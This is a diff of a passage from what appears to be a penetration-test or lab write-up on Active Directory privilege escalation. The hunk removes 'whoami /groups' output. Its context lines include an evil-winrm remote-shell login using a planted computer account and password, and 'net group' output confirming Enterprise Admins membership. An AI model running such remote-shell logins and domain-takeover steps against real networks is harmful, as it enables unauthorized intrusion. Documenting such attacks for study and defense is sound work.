@@ -313,30 +313,6 @@ evil-winrm -i 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd'
 Evil-WinRM leverages Windows Remote Management to give you a remote shell on Windows systems. It runs over standard ports often allowed through firewalls (5985/5986), provides a fully interactive PowerShell session, and includes convenient features for file transfers and script execution. Once connected, I confirmed our elevated privileges:
 
 ```
-*Evil-WinRM* PS C:\Users\ATTACKER-PC02$\Documents> whoami /groups
-
-GROUP INFORMATION
------------------
-
-Group Name                                    Type             SID                                           Attributes
-============================================= ================ ============================================= ===============================================================
-CORP\Domain Computers                         Group            S-1-5-21-1407252448-705099031-2271953844-515  Mandatory group, Enabled by default, Enabled group
-Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
-NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
-CORP\Enterprise Admins                        Group            S-1-5-21-1407252448-705099031-2271953844-519  Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level          Label            S-1-16-12288
-```
-
-This confirmed that our computer account had indeed been added to the Enterprise Admins group, granting it full control over the domain.
-
-I could further verify the membership by listing all members of the Enterprise Admins group:
-
-```
 *Evil-WinRM* PS C:\Users\ATTACKER-PC02$\Documents> net group "Enterprise Admins" /domain
 Group name     Enterprise Admins
 Comment        Designated administrators of the enterprise
